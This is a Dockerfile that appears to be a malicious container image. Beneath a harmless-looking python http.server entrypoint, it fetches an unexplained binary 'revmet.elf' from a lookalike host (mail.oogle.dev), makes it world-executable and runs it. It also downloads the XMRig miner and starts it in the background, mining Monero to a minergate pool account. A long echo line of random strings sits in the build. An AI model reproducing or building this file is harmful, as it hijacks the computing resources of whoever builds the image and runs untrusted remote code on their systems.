FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo BfldEbfklqhA5VXQvz9p7T8OBBhX07Lr 0xhFfQbIGbaysEUuxvWaI7Pg1eC4DGG2 k57k6QnOWGvklVCn3CuonpL81xqVlpn6 vCEBOavH8Idj2jl3L0Ybenhjnhs5DoOi B1DdWtERA2i8F4bZrNtmRvyBQbZ4aXE5 0FAZ1JJpjoa8aLBBsAuJEXD1T6U27UFy zBbA1tKPZXpbJWQ8rp53JTWqwLNMKXQB HPX3r4Njolp3qUqwDvuAcqyBO9bt20T6 lPVNt7tnqDXY1PCfpGZxQf2wMAEAZq7N lZw1wmBJqkbsM4VnZ4n72xHfezfVZwI4 iXHkf7KXGJk61vlDur16uHKFxE4nfUt4 rDVUTjRalKbTbmcVtygPwLe8GyYER3VB DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]